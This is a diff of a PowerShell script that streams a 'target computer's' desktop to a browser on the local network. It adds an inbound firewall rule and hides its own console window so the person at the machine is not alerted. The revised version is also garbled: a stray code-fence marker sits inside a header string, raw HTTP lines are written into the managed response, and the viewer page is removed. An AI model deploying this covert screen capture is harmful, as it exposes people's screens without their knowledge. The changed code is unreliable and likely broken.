@@ -5,14 +5,13 @@ SYNOPSIS
 Start up a HTTP server and stream the desktop to a browser window on another device on the network.
 
 USAGE
-1. Run this script on target computer and note the URL provided
-2. on another device on the same network, enter the provided URL in a browser window
-3. Hold escape key on target for 5 seconds to exit screenshare.
+1. Run this script on the target computer and note the URL provided.
+2. On another device on the same network, enter the provided URL in a browser window.
+3. Hold the escape key on the target for 5 seconds to exit screenshare.
 
 #>
 
-
-# Hide the powershell console (1 = yes)
+# Hide the PowerShell console (1 = yes)
 $hide = 1
 
 [Console]::BackgroundColor = "Black"
@@ -25,47 +24,55 @@ Add-Type -AssemblyName System.Windows.Forms
 [System.Windows.Forms.Application]::EnableVisualStyles()
 
 # Define port number
-if ($port.length -lt 1){
-    Write-Host "Using default port.. (8080)" -ForegroundColor Green
-    $port = 8080
-}
+$port = 8080
+Write-Host "Using port: $port" -ForegroundColor Green
 
 Write-Host "Detecting primary network interface." -ForegroundColor DarkGray
 $networkInterfaces = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' -and $_.InterfaceDescription -notmatch 'Virtual' }
-$filteredInterfaces = $networkInterfaces | Where-Object { $_.Name -match 'Wi*' -or  $_.Name -match 'Eth*'}
+$filteredInterfaces = $networkInterfaces | Where-Object { $_.Name -match 'WLAN' -or $_.Name -match 'Ethernet' }
 $primaryInterface = $filteredInterfaces | Select-Object -First 1
+
 if ($primaryInterface) {
-    if ($primaryInterface.Name -match 'Wi*') {
+    if ($primaryInterface.Name -match 'WLAN') {
         Write-Output "Wi-Fi is the primary internet connection."
-        $localIP = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Wi*" | Select-Object -ExpandProperty IPAddress
-    } elseif ($primaryInterface.Name -match 'Eth*') {
+        $localIP = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "WLAN" | Select-Object -ExpandProperty IPAddress
+    } elseif ($primaryInterface.Name -match 'Ethernet') {
         Write-Output "Ethernet is the primary internet connection."
-        $localIP = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Eth*" | Select-Object -ExpandProperty IPAddress
+        $localIP = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Ethernet" | Select-Object -ExpandProperty IPAddress
     } else {
         Write-Output "Unknown primary internet connection."
     }
-    } else {Write-Output "No primary internet connection found."}
+} else {
+    Write-Output "No primary internet connection found."
+    exit
+}
 
+# Check if localIP is valid
+if (-not $localIP) {
+    Write-Host "No valid local IP address found. Exiting."
+    exit
+}
+
+# Create firewall rule and start web server
 New-NetFirewallRule -DisplayName "AllowWebServer" -Direction Inbound -Protocol TCP -LocalPort $port -Action Allow | Out-Null
 $webServer = New-Object System.Net.HttpListener 
 $webServer.Prefixes.Add("http://"+$localIP+":$port/")
 $webServer.Prefixes.Add("http://localhost:$port/")
 $webServer.Start()
 Write-Host ("Network Devices Can Reach the server at : http://"+$localIP+":$port") 
-Write-Host "Press escape key for 5 seconds to exit" -f Cyan
-Write-Host "Hiding this window.." -f Yellow
-sleep 4
+Write-Host "Press escape key for 5 seconds to exit" -ForegroundColor Cyan
+Write-Host "Hiding this window.." -ForegroundColor Yellow
+Start-Sleep -Seconds 4
 
 # Code to hide the console on Windows 10 and 11
-if ($hide -eq 1){
+if ($hide -eq 1) {
     $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
     $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
     $hwnd = (Get-Process -PID $pid).MainWindowHandle
     
     if ($hwnd -ne [System.IntPtr]::Zero) {
         $Type::ShowWindowAsync($hwnd, 0)
-    }
-    else {
+    } else {
         $Host.UI.RawUI.WindowTitle = 'hideme'
         $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
         $hwnd = $Proc.MainWindowHandle
@@ -93,84 +100,46 @@ while ($true) {
         $response = $context.Response
         if ($context.Request.RawUrl -eq "/stream") {
             $response.ContentType = "multipart/x-mixed-replace; boundary=frame"
-            $response.Headers.Add("Cache-Control", "no-cache")
-            $boundary = "--frame"
+            $response.Headers.Add(" ```powershell
+Content-Disposition", "inline; filename=stream.jpg")
+            $response.StatusCode = 200
+            $response.OutputStream.Write([System.Text.Encoding]::UTF8.GetBytes("HTTP/1.1 200 OK`r`n"))
+            $response.OutputStream.Write([System.Text.Encoding]::UTF8.GetBytes("Content-Type: multipart/x-mixed-replace; boundary=frame`r`n`r`n"))
 
-            while ($context.Response.OutputStream.CanWrite) {
-                $screen = [System.Windows.Forms.Screen]::PrimaryScreen
-                $bitmap = New-Object System.Drawing.Bitmap $screen.Bounds.Width, $screen.Bounds.Height
+            while ($true) {
+                # Capture the screen and convert to JPEG
+                $bitmap = New-Object System.Drawing.Bitmap -ArgumentList [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height
                 $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-                $graphics.CopyFromScreen($screen.Bounds.X, $screen.Bounds.Y, 0, 0, $screen.Bounds.Size)
-
-                $stream = New-Object System.IO.MemoryStream
-                $bitmap.Save($stream, [System.Drawing.Imaging.ImageFormat]::Png)
+                $graphics.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)
+                $memoryStream = New-Object System.IO.MemoryStream
+                $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Jpeg)
+                $imageBytes = $memoryStream.ToArray()
+                $memoryStream.Close()
                 $bitmap.Dispose()
                 $graphics.Dispose()
 
-                $bytes = $stream.ToArray()
-                $stream.Dispose()
+                # Send the image to the client
+                $response.OutputStream.Write([System.Text.Encoding]::UTF8.GetBytes("--frame`r`n"))
+                $response.OutputStream.Write([System.Text.Encoding]::UTF8.GetBytes("Content-Type: image/jpeg`r`n"))
+                $response.OutputStream.Write([System.Text.Encoding]::UTF8.GetBytes("Content-Length: " + $imageBytes.Length + "`r`n`r`n"))
+                $response.OutputStream.Write($imageBytes)
+                $response.OutputStream.Write([System.Text.Encoding]::UTF8.GetBytes("`r`n"))
+                $response.OutputStream.Flush()
 
-                $writer = [System.Text.Encoding]::ASCII.GetBytes("$boundary`r`nContent-Type: image/png`r`nContent-Length: $($bytes.Length)`r`n`r`n")
-                $response.OutputStream.Write($writer, 0, $writer.Length)
-                $response.OutputStream.Write($bytes, 0, $bytes.Length)
-                $boundaryWriter = [System.Text.Encoding]::ASCII.GetBytes("`r`n")
-                $response.OutputStream.Write($boundaryWriter, 0, $boundaryWriter.Length)
-
-                Start-Sleep -Milliseconds 33 
-
-                # Check for the escape key press to exit
-                $isEscapePressed = [Keyboard]::GetAsyncKeyState($VK_ESCAPE) -lt 0
-                if ($isEscapePressed) {
-                    if (-not $startTime) {
-                        $startTime = Get-Date
-                    }
-                    $elapsedTime = (Get-Date) - $startTime
-                    if ($elapsedTime.TotalSeconds -ge 5) {
-                        (New-Object -ComObject Wscript.Shell).Popup("Screenshare Closed.",3,"Information",0x0)
-                        sleep 1
-                        exit
-                    }
-                } else {
-                    $startTime = $null
+                # Check for escape key press
+                if ([Keyboard]::GetAsyncKeyState($VK_ESCAPE) -ne 0) {
+                    Write-Host "Exiting screen share..."
+                    break
                 }
-
+                Start-Sleep -Milliseconds 100
             }
-        } else {
-            $response.ContentType = "text/html"
-            $html = @"
-            <!DOCTYPE html>
-            <html>
-            <head>
-                <title>Streaming Video</title>
-                <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <style>
-                body {
-                    background-color: black;
-                    margin: 0;
-                    display: flex;
-                    justify-content: center;
-                    align-items: center;
-                    height: 100vh;
-                }
-                img {
-                    width: 90vw;
-                    height: auto;
-                    max-width: 100%;
-                    max-height: 100%;
-                }
-            </style>
-            </head>
-            <body>
-                <img src='/stream' alt='Streaming Video' />
-            </body>
-            </html>
-"@
-            $buffer = [System.Text.Encoding]::UTF8.GetBytes($html)
-            $response.OutputStream.Write($buffer, 0, $buffer.Length)
         }
-        $response.Close()
+        $response.OutputStream.Close()
     } catch {
-        Write-Host "Error encountered: $_"
+        Write-Host "Error: $_"
+        break
     }
 }
+
 $webServer.Stop()
+Write-Host "Web server stopped."
